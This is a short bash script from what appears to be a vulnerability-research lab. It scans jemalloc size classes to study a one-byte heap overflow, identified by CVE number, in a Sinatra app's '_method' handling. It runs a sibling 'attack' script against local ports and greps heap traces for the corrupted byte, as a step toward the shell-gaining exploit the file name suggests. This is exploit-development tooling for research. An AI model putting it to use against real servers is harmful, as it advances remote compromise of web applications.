#!/usr/bin/env bash
# Production-mode jemalloc size-class scan for the CVE-2026-132825 one-byte
# overflow. Analysis only: no hook, middleware, debugger write or marker is
# added to the request path. The stock classic Sinatra app is unchanged.
#
# Each class C builds a `_method` part whose case-mapping buffer is
# C-24 bytes; the 21st sharp-s writes 0x53 at buffer+capa. jemtrace dumps the
# adjacent qwords when that buffer is freed. Backtraces are captured for
# allocations in [C-96, C+96] so the adjacent allocation can be attributed.
#
# Usage: bash lab/repro/ruby2shell-prod-class-scan.sh [class ...]
# Evidence: lab/build/evidence/prodscan<C>.{trace,out,maps,server.log}
set -u
cd "$(dirname "$0")/../.." || exit 2
CLASSES="${*:-112 160 192 224 256 320 384}"
for c in $CLASSES; do
  port=$((4650 + c / 10))
  lo=$((c - 96)); hi=$((c + 96))
  printf '== C=%s port=%s\n' "$c" "$port"
  JEM_RACK_ENV=production JEM_CLASS="$c" \
    JEM_BT_MIN="$lo" JEM_BT_MAX="$hi" JEM_BT_DEPTH=16 \
    JEM_WIRE_PORT="$port" timeout 90 \
    bash lab/repro/ruby2shell-jemalloc-wire.sh attack "prodscan${c}"
  capa=$(printf '%016x' $((c - 24)))
  printf 'q0 at corrupted qword: '
  grep -A8 "b=$capa" "lab/build/evidence/prodscan${c}.trace" \
    | grep 'a=.*53$' | head -1
done
